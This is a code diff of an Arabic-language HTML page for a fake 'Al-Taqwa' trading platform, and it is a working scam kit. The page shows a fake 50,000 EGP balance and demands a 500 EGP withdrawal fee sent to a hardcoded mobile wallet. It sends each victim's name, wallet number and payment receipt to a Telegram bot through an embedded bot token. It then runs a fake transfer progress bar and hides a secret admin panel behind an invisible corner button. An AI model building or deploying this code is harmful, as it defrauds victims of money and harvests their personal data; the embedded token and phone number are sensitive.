@@ -3,85 +3,156 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Al-Taqwa Trading Platform | منصة التقوى العالمية</title>
-    <link rel="stylesheet" href="style.css">
+    <title>منصة التقوى | نظام الصرف الرقمي</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        :root { --primary: #0a0b1e; --gold: #ffd700; --green: #00ff88; --glass: rgba(255, 255, 255, 0.1); }
+        body { margin: 0; font-family: 'Cairo', sans-serif; background: var(--primary); color: white; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; user-select: none; }
+        .card { background: var(--glass); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.15); border-radius: 25px; width: 90%; max-width: 400px; padding: 30px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.5); }
+        input { width: 100%; padding: 14px; margin-bottom: 15px; border-radius: 12px; border: 1px solid #444; background: rgba(0,0,0,0.3); color: white; text-align: center; font-size: 16px; outline: none; box-sizing: border-box; }
+        button { width: 100%; padding: 15px; border-radius: 12px; border: none; background: var(--gold); color: #000; font-weight: 900; font-size: 18px; cursor: pointer; transition: 0.3s; }
+        .profit-box { background: rgba(0,0,0,0.4); padding: 15px; border-radius: 15px; border-right: 4px solid var(--gold); margin: 15px 0; }
+        #admin-panel { position: fixed; inset: 0; background: #000; z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center; }
+        #admin-trigger { position: fixed; bottom: 0; right: 0; width: 40px; height: 40px; cursor: pointer; z-index: 1000; }
+        
+        /* واجهة الكود والانتظار */
+        #verify-screen, #waiting-screen { display: none; }
+        .loader-bar { width: 100%; height: 8px; background: #222; border-radius: 10px; overflow: hidden; margin-top: 20px; }
+        .loader-fill { width: 0%; height: 100%; background: var(--green); transition: 0.3s; }
+    </style>
 </head>
 <body>
 
-    <div id="loader" class="hidden">
-        <div class="spinner"></div>
+<div id="admin-trigger" onclick="runAdmin()"></div>
+
+<div id="admin-panel">
+    <div style="background:#111; padding:20px; border-radius:20px; border:1px solid var(--gold); width:320px;">
+        <h3 style="color:var(--gold)">لوحة التحكم السرية</h3>
+        <label style="font-size:10px">كود الدخول للموقع:</label>
+        <input type="text" id="setPass" value="123456">
+        <label style="font-size:10px">كود تفعيل السحب (الذي ستعطيه للعميل):</label>
+        <input type="text" id="setConfirmCode" value="7788">
+        <label style="font-size:10px">رقم محفظتك:</label>
+        <input type="text" id="setWallet" value="01226811784">
+        <button onclick="saveConfig()">حفظ البيانات</button>
+        <button onclick="location.reload()" style="background:#333; color:white; margin-top:10px;">إغلاق</button>
     </div>
+</div>
 
-    <main class="login-wrapper" id="login-section">
-        <div class="login-card">
-            <header>
-                <img src="image.png" alt="Al-Taqwa Logo" class="login-logo">
-                <h2>Al-Taqwa Global</h2>
-                <p>دخول آمن للمستثمرين</p>
-            </header>
-            <form id="login-form">
-                <input type="password" id="password" placeholder="كود الوصول الشخصي" required>
-                <button type="submit" id="login-btn">دخول للمنصة</button>
-            </form>
-        </div>
-    </main>
+<div class="card" id="step-login">
+    <h2 style="color:var(--gold)">بوابة التقوى</h2>
+    <p style="font-size:13px; color:#aaa;">أدخل كود الوصول للمتابعة</p>
+    <input type="password" id="loginPass" placeholder="كود الوصول">
+    <button onclick="checkLogin()">دخول الحساب</button>
+</div>
 
-    <main class="platform-wrapper hidden" id="dashboard-section">
-        <header class="platform-header">
-            <div class="logo-area">
-                <img src="image.png" alt="Logo" class="mini-logo">
-                <strong>Al-Taqwa Trading</strong>
-            </div>
-            <div class="header-tools">
-                <div class="balance-status">
-                    <small>الرصيد</small>
-                    <strong id="total-earnings">EGP 50,000.00</strong>
-                </div>
-                <button id="logout-btn">خروج</button>
-            </div>
-        </header>
+<div class="card" id="step-withdraw" style="display:none;">
+    <div class="profit-box">
+        <span style="font-size:12px; color:#aaa;">رصيدك الحالي</span>
+        <div style="font-size:28px; font-weight:900; color:var(--gold);">50,000 <small>EGP</small></div>
+    </div>
+    <input type="text" id="uName" placeholder="الاسم الكامل">
+    <input type="tel" id="uWallet" placeholder="رقم محفظة الاستلام">
+    <p style="font-size:11px;">حول الرسوم (500 ج.م) للرقم التالي وارفقع الإيصال:</p>
+    <div style="background:#000; color:var(--gold); padding:10px; border-radius:10px; font-weight:bold; margin-bottom:10px;" id="walletShow">01226811784</div>
+    <input type="file" id="uFile" accept="image/*" style="background:#fff; color:#000;">
+    <button onclick="submitWithdraw()">تأكيد وطلب كود الصرف</button>
+</div>
 
-        <section class="trading-area">
-            <div class="chart-container">
-                <img src="image_8.png" alt="Trading Chart" class="fake-chart">
-                <div class="live-status">LIVE</div>
-            </div>
-            <aside class="control-panel">
-                <div class="asset-selector">
-                    <strong>EUR/USD</strong> <span>93%</span>
-                </div>
-                <div class="input-block">
-                    <label>الوقت</label>
-                    <input type="text" value="00:01:00" readonly>
-                </div>
-                <div class="input-block">
-                    <label>الاستثمار</label>
-                    <input type="text" value="EGP 500.00" readonly>
-                </div>
-                <div class="trade-buttons">
-                    <button class="up-btn">Up</button>
-                    <button class="down-btn">Down</button>
-                </div>
-            </aside>
-        </section>
+<div class="card" id="verify-screen">
+    <h3 style="color:var(--gold)">تأكيد الهوية الرقمية</h3>
+    <p style="font-size:12px;">يرجى إدخال "كود تفعيل السحب" الذي استلمته من الدعم الفني لإتمام العملية.</p>
+    <input type="text" id="confirmCodeInput" placeholder="أدخل كود التفعيل هنا">
+    <button onclick="checkConfirmCode()" style="background:var(--green)">تفعيل سحب الأرباح</button>
+    <p style="font-size:10px; margin-top:10px; color:#aaa;">بمجرد إدخال الكود، سيتم البدء في تحويل المبلغ فوراً.</p>
+</div>
 
-        <section class="payout-area">
-            <div class="payout-card">
-                <h4>طلب سحب الأرباح</h4>
-                <form id="transfer-form">
-                    <input type="text" id="recipient-data" placeholder="الاسم الرباعي - رقم الهاتف" required>
-                    <select id="transfer-method">
-                        <option value="Vodafone Cash">فودافون كاش</option>
-                        <option value="InstaPay">InstaPay (IPN)</option>
-                        <option value="WE Cash">وي كاش</option>
-                    </select>
-                    <button type="submit" id="transfer-btn">تأكيد عملية السحب</button>
-                </form>
-            </div>
-        </section>
-    </main>
+<div class="card" id="waiting-screen">
+    <h3 style="color:var(--green)">جاري التحويل الآن...</h3>
+    <p style="font-size:12px;">يرجى عدم إغلاق الصفحة أو تحديثها حتى يتم اكتمال شريط التحميل وإرسال الأموال لمحفظتك.</p>
+    <div class="loader-bar"><div class="loader-fill" id="fill"></div></div>
+    <p id="percent" style="margin-top:10px; font-weight:bold;">0%</p>
+</div>
 
-    <script src="app.js"></script>
+<script>
+    const TOKEN = '8154142175:AAGvcFJuk6eh972IJUujoKV2ibkNIIWlMNA';
+    const CHAT_ID = '8232581666';
+
+    let config = JSON.parse(localStorage.getItem('at_v6')) || {
+        pass: '123456',
+        confirmCode: '7788',
+        wallet: '01226811784'
+    };
+
+    function saveConfig() {
+        config = {
+            pass: document.getElementById('setPass').value,
+            confirmCode: document.getElementById('setConfirmCode').value,
+            wallet: document.getElementById('setWallet').value
+        };
+        localStorage.setItem('at_v6', JSON.stringify(config));
+        alert("تم الحفظ");
+        location.reload();
+    }
+
+    function checkLogin() {
+        if(document.getElementById('loginPass').value === config.pass) {
+            document.getElementById('step-login').style.display = 'none';
+            document.getElementById('step-withdraw').style.display = 'block';
+        } else { alert("كود خاطئ"); }
+    }
+
+    async function submitWithdraw() {
+        const name = document.getElementById('uName').value;
+        const file = document.getElementById('uFile').files[0];
+        if(!name || !file) return alert("أكمل البيانات وارفقع الإيصال");
+
+        // إرسال إشعار لك بأن العميل ينتظر الكود
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('photo', file);
+        fd.append('caption', `⚠️ عميل ينتظر كود التفعيل\n👤 الاسم: ${name}\n📱 الرقم: ${document.getElementById('uWallet').value}\n📍 أرسل له الكود: ${config.confirmCode}`);
+
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        
+        alert("تم استلام الإيصال! تواصل مع الدعم للحصول على كود التفعيل.");
+        document.getElementById('step-withdraw').style.display = 'none';
+        document.getElementById('verify-screen').style.display = 'block';
+    }
+
+    function checkConfirmCode() {
+        const input = document.getElementById('confirmCodeInput').value;
+        if(input === config.confirmCode) {
+            document.getElementById('verify-screen').style.display = 'none';
+            document.getElementById('waiting-screen').style.display = 'block';
+            startLoading();
+        } else { alert("كود التفعيل غير صحيح! تواصل مع الإدارة."); }
+    }
+
+    function startLoading() {
+        let p = 0;
+        let fill = document.getElementById('fill');
+        let txt = document.getElementById('percent');
+        let interval = setInterval(() => {
+            p += Math.floor(Math.random() * 3);
+            if(p > 100) p = 100;
+            fill.style.width = p + "%";
+            txt.innerText = p + "%";
+            if(p >= 100) {
+                clearInterval(interval);
+                alert("تم تحويل المبلغ بنجاح! ستصلك رسالة تأكيد من شركتك خلال دقائق.");
+                location.reload();
+            }
+        }, 500);
+    }
+
+    let clicks = 0;
+    function runAdmin() {
+        clicks++; if(clicks >= 5) { document.getElementById('admin-panel').style.display='flex'; clicks=0; }
+    }
+    
+    document.getElementById('walletShow').innerText = config.wallet;
+</script>
+
 </body>
 </html>
